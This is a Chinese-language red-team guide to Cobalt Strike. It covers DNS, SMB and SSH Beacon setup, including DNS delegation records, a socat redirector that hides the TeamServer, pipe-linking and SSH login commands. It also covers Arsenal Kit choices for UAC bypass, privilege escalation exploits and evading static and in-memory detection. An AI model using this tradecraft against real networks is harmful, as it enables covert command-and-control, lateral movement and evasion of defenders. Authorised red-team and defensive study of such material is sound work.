# Cobalt Strike Beacon 类型与 Arsenal Kit 选择

本文档补充 DNS/SMB/SSH Beacon 与 Arsenal Kit 的操作边界。核心目标是先判断通信路径与检测压力，再选择 Beacon 类型和 Kit，而不是按工具菜单逐项尝试。

---

## DNS Beacon

DNS Beacon 适合 HTTP/HTTPS 出网受限、但 DNS 可解析的环境。它的交互速度慢，适合作为低频保活或受限网络中的备用通道，不适合高频文件传输和大量交互命令。

### DNS 架构要求

TeamServer 必须对 Listener 中配置的域名或子域具有权威解析能力。常见做法是：

1. 创建指向 TeamServer 或 DNS redirector 的 `A` 记录。
2. 用 `NS` 记录把 Beacon 子域委派到该 `A` 记录。
3. 在 Cobalt Strike 中创建 `Beacon DNS` Listener。
4. 从外部网络验证随机子域查询是否能到达 TeamServer。

```text
NS  example.com                     directs to 10.10.10.10
NS  polling.campaigns.example.com   directs to campaigns.example.com
A   campaigns.example.com           directs to 10.10.10.10
```

验证时使用随机子域，预期响应通常不是业务记录，而是确认查询链路会被 TeamServer 接收：

```bash
nslookup random.beacon polling.campaigns.example.com
nslookup random.beacon campaigns.example.com
```

### DNS redirector

DNS redirector 用于隐藏 TeamServer，并把 UDP/53 转发到后端：

```bash
socat -T 1 udp4-listen:53,fork udp4:teamserver.example.net:53
```

排障时抓 UDP/53，先确认查询是否到达 redirector，再确认是否转发到 TeamServer：

```bash
tcpdump -l -n -s 5655 -i eth0 udp port 53
```

### DNS 模式选择

| 模式 | 适用场景 | 代价 |
|---|---|---|
| `mode dns-txt` | 默认数据通道，容量相对更高 | TXT 查询特征更明显 |
| `mode dns` | 只允许 A 记录查询的网络 | 带宽更低 |
| `mode dns6` | IPv6/AAAA 查询可用的环境 | 依赖目标网络 IPv6 行为 |

---

## SMB Beacon

SMB Beacon 使用命名管道，适合内网横向后让不出网主机通过已上线主机回传。使用前先确认目标之间 SMB 可达，并且当前身份对目标有足够访问权限。

```text
link <host> <pipename>
connect <host> <port>
unlink <host> <pid>
jump <exec> <host> <pipe>
```

常见错误可以直接指导下一步排查：

| 错误码 | 含义 | 排查方向 |
|---|---|---|
| `2` | File Not Found | 目标上没有可连接的 Beacon，或 pipe name 错误 |
| `5` | Access is denied | 凭据无效、权限不足，或令牌未正确切换 |
| `53` | Bad Netpath | 主机不可达、名称解析失败，或双方没有可用信任路径 |

---

## SSH Beacon

SSH Beacon 适合把 Linux/macOS 主机纳入同一 C2 操作面。它依赖 SSH 认证，不是漏洞利用方式；使用前需要已有口令或私钥。

```text
ssh <target:port> <user> <pass>
ssh-key <target:port> <user> </path/to/key.pem>
```

上线后常用能力包括文件传输、shell 命令、SOCKS 和反向端口转发：

```text
upload
download
shell
sudo
socks
rportfwd
```

---

## Arsenal Kit 选择

Arsenal Kit 解决的是“生成物、内存特征、后渗透模块”如何适配目标环境的问题。它不能替代授权、网络路径和权限前提判断。

| Kit | 解决的问题 | 适用时机 |
|---|---|---|
| Elevate Kit | 扩展 UAC bypass / 本地提权选项 | 内置 `elevate` / `runasadmin` 不满足目标版本时 |
| Resource Kit | 修改 HTA、PowerShell、Python、VBA、VBS 模板 | 默认脚本模板被检测或需贴近目标业务样式时 |
| Artifact Kit | 修改 EXE/DLL 生成模板 | 生成物落地即被静态查杀时 |
| Mimikatz Kit | 替换或定制内置 Mimikatz 集成 | 凭据模块被检测或需要版本适配时 |
| Sleep Mask Kit | Beacon sleep 时内存混淆 | 内存扫描关注 sleep 状态 Beacon 时 |
| Mutator Kit | 生成变形 sleep mask 对象 | 静态签名针对 sleep mask 对象时 |
| Thread Stack Spoofer | 伪装线程调用栈 | 检测重点在异常线程栈或内存驻留 shellcode 时 |

### Elevate Kit 边界

`uac-token-duplication` 只适用于特定旧系统路径，Windows 10 Redstone 5（2018 年 10 月）后已修复。选择提权模块前，先确认目标版本、当前用户是否属于本地管理员组，以及是否只是 UAC 中完整性级别受限。

```text
runasadmin
```

常见 Elevate Kit 选项包括 `ms14-058`、`ms15-051`、`ms16-016`、`svc-exe`、`uac-schtasks`、`uac-token-duplication`。不要把这些选项当作通用提权能力；它们依赖系统版本、补丁状态和当前权限。

### Artifact Kit 使用判断

Artifact Kit 的价值在于修改生成模板，而不是保证“免杀”。常见调整包括替换 pipe name、替换分配内存 API、调整 import、重新 build 后加载对应 `.cna`。

```text
Help → Arsenal → Artifact Kit
Cobalt Strike → Script Manager → Load artifact.cna
```

### Sleep Mask / Mutator / Thread Stack Spoofer

这三类能力面向内存驻留检测：

- Sleep Mask Kit：Beacon sleep 前混淆内存内容。
- Mutator Kit：用 LLVM obfuscation 生成变形对象，降低固定签名命中。
- Thread Stack Spoofer：隐藏或伪装线程调用栈特征。

这些能力应与 Malleable C2 Profile、`spawnto`、PPID、进程选择一起设计；只改 Kit 不改变异常通信和异常进程链，仍然容易被关联检测。
